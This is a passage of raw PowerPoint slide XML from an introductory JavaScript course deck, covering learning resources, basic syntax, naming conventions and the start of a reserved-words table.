              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>https://phaser.io/examples</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2800" dirty="0">
              <a:hlinkClick r:id="rId5"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2800" dirty="0">
              <a:hlinkClick r:id="rId5"/>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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{824497C6-841A-4944-BB41-61E8AD058014}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Sources of Information</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{155060E3-2A5C-417A-BB60-194BDF7845DA}"/>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dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Eloquent JavaScript </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(free online book, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>PDF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>You Don't Know JS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(book series)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>JavaScript for impatient programmers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>PDF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:hlinkClick r:id="rId8"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t>https://developer.mozilla.org/bm/docs/Web/JavaScript</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId9"/>
              </a:rPr>
              <a:t>https://javascript.info/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:hlinkClick r:id="rId10"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId11"/>
              </a:rPr>
              <a:t>https://www.freecodecamp.org/learn</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId11"/>
              </a:rPr>
              <a:t>https://www.learn-js.org/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId12"/>
              </a:rPr>
              <a:t>https://www.w3schools.com/js/</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId13"/>
              </a:rPr>
              <a:t>http://es6-features.org/#Constants</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId14"/>
              </a:rPr>
              <a:t>https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>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tsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B90B0C8A-2101-4724-AA1A-5461DC93CB91}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Basic Syntax</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9AE2028A-849C-4CCA-914B-7412970D63EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="77500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>borrowed from C/Java programming language, but heavily inspired by Python as well</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>curly braces {} denote the beginning and end of block</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/* multi-line comment */</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// one line comment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Names are case sensitive, so Abc, abc and ABC are all different names. Names must begin with a-z, A-Z, _ or $ and can contain numbers 0-9.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>semi-colon is strictly not necessary, unless you have multiple statements per line. Semicolons are recommended though!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>a = 3;</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 = 3 // this is also okay</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 = 3; b = 4 // semicolon is needed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>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tsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E5657740-01DD-4194-B8FA-F10B300095F3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>Common Conventions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C5CE9914-3CFA-45CB-B9B2-1693F6124759}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>normalVariable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> // camelCase</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ClassName // begin with uppercase</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>STATIC_VARIABLE // value never changes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() // used in functions, calls, mathematics</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>[] // indexing arrays, defining arrays</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>{} // objects, blocks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'use strict' // in beginning of file</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"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tsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{877950C6-49D4-4844-AAF3-258BCA4EE5DB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Reserved Words</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Sisällön paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{11113C5C-5B26-4A72-A6E6-C1C6FD8C7239}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="680826255"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1600200"/>
          <a:ext cx="10972800" cy="4446587"/>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446587">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>abstract</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>async</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>await</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>boolean</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>break</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>byte</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>case</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>catch</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>char</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>class</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>const</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>continue</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>debugger</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>default</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>delete</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>do</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="28575" marR="28575" marT="28569" marB="28569">
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>double</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>else</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>enum</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>export</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>extends</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>false</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>final</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>finally</a:t>
                      </a:r>
                      <a:br>
